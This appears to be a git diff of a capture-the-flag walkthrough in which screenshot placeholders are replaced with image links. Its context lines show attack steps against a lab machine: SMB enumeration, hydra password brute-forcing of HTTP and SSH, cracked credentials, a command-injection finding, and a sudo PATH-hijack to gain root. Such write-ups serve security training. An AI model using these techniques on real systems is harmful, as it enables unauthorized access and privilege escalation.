@@ -15,7 +15,7 @@
 nmap <TARGET_IP>
 ```
 
-[SCREEN01]
+<img width="721" height="286" alt="SCREEN01" src="https://github.com/user-attachments/assets/41b5fd8f-0774-467f-9d40-85f4837af2fb" />
 
 2. Check if SMB allows anonymous access and what shares are available
 
@@ -23,7 +23,7 @@ nmap <TARGET_IP>
 smbclient -L //<TARGET_IP> -N
 ```
 
-[SCREEN02]
+<img width="721" height="141" alt="SCREEN02" src="https://github.com/user-attachments/assets/0f57ef6d-1fa4-4ff1-8756-e6df67090327" />
 
 3. Use enum4linux to perform comprehensive SMB enumeration and gather user information
    - This reveals valuable information about users, shares, and system details. We discover potential usernames that can be used for further attacks
@@ -32,7 +32,7 @@ smbclient -L //<TARGET_IP> -N
 enum4linux -a <TARGET_IP>
 ```
 
-[SCREEN03]
+<img width="720" height="435" alt="SCREEN03" src="https://github.com/user-attachments/assets/643c1710-96b7-4735-9a2b-24ea2d9dc439" />
 
 4. From our enumeration, we found a potential username `rascal`. Let's attempt to brute force the HTTP basic authentication
    - Discovered credentials: `rascal:shelley`
@@ -41,11 +41,11 @@ enum4linux -a <TARGET_IP>
 hydra -l rascal -P /root/Tools/wordlists/rockyou.txt <TARGET_IP> http-get / -I -t 64
 ```
 
-[SCREEN04]
+<img width="723" height="284" alt="SCREEN04" src="https://github.com/user-attachments/assets/9c129e98-d68e-4b46-81ce-bf99f1a599a9" />
 
 5.  Log in to `http://<TARGET_IP>/` using the discovered credentials. Use Burp Suite to intercept HTTP requests
 
-[SCREEN05]
+<img width="1054" height="410" alt="SCREEN05" src="https://github.com/user-attachments/assets/29bea022-4c28-49d7-bbf5-f7a87a190124" />
 
 6. Through analysis of the web application, we identify a command injection vulnerability in the search functionality. We can exploit this to read the web flag
 
@@ -60,7 +60,7 @@ Authorization: Basic cmFzY2FsOnNoZWxsZXk=
 }
 ```
 
-[SCREEN06]
+<img width="1055" height="273" alt="SCREEN06" src="https://github.com/user-attachments/assets/860a085d-a4c3-4531-862f-e451bd172bae" />
 
 ---
 
@@ -128,7 +128,7 @@ chmod +x socat
 hydra -l fox -P /root/Tools/wordlists/rockyou.txt ssh://<TARGET_IP>:2222
 ```
 
-[SCREEN07]
+<img width="723" height="322" alt="SCREEN07" src="https://github.com/user-attachments/assets/656e7515-a078-44e1-a4f9-b92adf68846a" />
 
 6. With valid SSH credentials, we can now log in and retrieve the user flag
 
@@ -137,7 +137,7 @@ ssh fox@<TARGET_IP> -p 2222
 cat /home/fox/user-flag.txt
 ```
 
-[SCREEN08]
+<img width="723" height="34" alt="SCREEN08" src="https://github.com/user-attachments/assets/7fe1f6c6-bb3c-474e-938f-cb3c3512925d" />
 
 ---
 
@@ -150,7 +150,7 @@ cat /home/fox/user-flag.txt
 sudo -l
 ```
 
-[SCREEN09]
+<img width="721" height="108" alt="SCREEN09" src="https://github.com/user-attachments/assets/fb3ec113-3eaf-480c-ab90-fadc000d02b7" />
 
 2. We can exploit the sudo permission by hijacking the PATH to execute our own malicious `poweroff` command instead of the legitimate one
 
@@ -162,7 +162,7 @@ export PATH=/tmp:$PATH
 sudo /usr/sbin/shutdown
 ```
 
-[SCREEN10]
+<img width="719" height="108" alt="SCREEN10" src="https://github.com/user-attachments/assets/98c77f97-525f-457b-8776-d36658af1bd2" />
 
 3. Now with root access, we can explore the system and find the root flag
 
@@ -172,4 +172,4 @@ ls -la
 cat cat .did-you-think-I-was-useless.root
 ```
 
-[SCREEN11]
+<img width="720" height="272" alt="SCREEN11" src="https://github.com/user-attachments/assets/9c88f398-35ce-483a-8ba1-66f1425e1875" />
